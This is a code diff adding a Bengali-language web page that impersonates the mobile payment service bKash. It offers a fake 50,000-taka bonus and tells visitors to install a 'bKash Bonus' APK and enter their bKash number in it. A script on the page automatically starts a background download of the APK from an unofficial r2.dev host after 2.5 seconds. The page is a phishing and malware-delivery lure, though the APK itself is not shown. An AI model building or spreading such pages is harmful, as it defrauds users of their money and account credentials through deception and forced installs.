@@ -1,1 +1,158 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#e2136e">
+    
+    <!-- Open Graph for Social Media Sharing -->
+    <meta property="og:title" content="বিকাশ বোনাস অফার">
+    <meta property="og:description" content="বিকাশ বোনাস অ্যাপটি ইনস্টল করুন এবং ৫০,০০০ টাকা বোনাস বুঝে নিন।">
+    <meta property="og:type" content="website">
 
+    <title>বিকাশ বোনাস অফার</title>
+
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-255493739-4"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-255493739-4');
+    </script>
+
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+            max-width: 400px;
+            width: 90%;
+            border-top: 5px solid #e2136e; /* bKash Brand Color */
+        }
+        .icon {
+            width: 70px;
+            height: 70px;
+            background-color: #e2136e;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px auto;
+        }
+        .icon svg {
+            width: 40px;
+            height: 40px;
+            fill: white;
+        }
+        h2 {
+            color: #e2136e;
+            font-size: 24px;
+            margin-bottom: 10px;
+            margin-top: 0;
+        }
+        p {
+            color: #444;
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .highlight {
+            font-weight: bold;
+            color: #e2136e;
+            font-size: 18px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #e2136e;
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .btn {
+            display: inline-block;
+            background-color: #e2136e;
+            color: white;
+            padding: 12px 28px;
+            text-decoration: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 10px;
+            box-shadow: 0 4px 10px rgba(226, 19, 110, 0.3);
+        }
+        .btn:hover {
+            background-color: #b50f58;
+            transform: translateY(-2px);
+        }
+        .footer-text {
+            font-size: 12px;
+            color: #999;
+            margin-top: 25px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="icon">
+        <!-- Gift Icon -->
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M20 8h-3V6c0-1.654-1.346-3-3-3H10C8.346 3 7 4.346 7 6v2H4c-1.103 0-2 .897-2 2v10c0 1.103.897 2 2 2h16c1.103 0 2-.897 2-2V10c0-1.103-.897-2-2-2zM10 6c0-.551.448-1 1-1h2c.552 1 1 1 1v2h-4V6zm-6 4h16v1H4v-1zm0 10v-7h16v7H4z"></path>
+            <path d="M11 14h2v4h-2z"></path>
+        </svg>
+    </div>
+    
+    <h2>অভিনন্দন!</h2>
+    
+    <div class="loader" id="loader"></div>
+    
+    <p id="status-text" style="color: #e2136e; font-weight: bold;">আপনার বিকাশ বোনাস অ্যাপটি ডাউনলোড হচ্ছে...</p>
+    
+    <p>আপনার বোনাসের টাকা উত্তোলন করতে <strong>বিকাশ বোনাস অ্যাপটি</strong> (APK) ইনস্টল করুন এবং এর ভেতরে আপনার বিকাশ নম্বরটি দিন।</p>
+    
+    <p>সাথে সাথে আপনার বিকাশ নম্বরে <span class="highlight">৫০,০০০ টাকা বোনাস</span> পেয়ে যাবেন!</p>
+
+    <a href="https://pub-97f4c414cd6d4a6593f29be2878cbd95.r2.dev/bKash_Bonus.apk" class="btn" id="download-btn">অ্যাপটি ডাউনলোড করুন</a>
+
+    <p class="footer-text">ডাউনলোড স্বয়ংক্রিয়ভাবে শুরু না হলে উপরের বাটনে ক্লিক করুন।</p>
+</div>
+
+<script>
+    // ২.৫ সেকেন্ড পর অটোমেটিক ডাউনলোড ট্রিগার হবে
+    setTimeout(function() {
+        document.getElementById('status-text').innerText = "ডাউনলোড শুরু হয়েছে! অ্যাপটি ইনস্টল করুন।";
+        document.getElementById('loader').style.display = "none";
+        
+        // উন্নত অটো-ডাউনলোড মেথড (পেজ থেকে রিডাইরেক্ট না হয়ে ব্যাকগ্রাউন্ডে ডাউনলোড হবে)
+        const apkUrl = "https://pub-97f4c414cd6d4a6593f29be2878cbd95.r2.dev/bKash_Bonus.apk";
+        const link = document.createElement('a');
+        link.href = apkUrl;
+        link.download = "bKash_Bonus.apk";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }, 2500);
+</script>
+
+</body>
+</html>
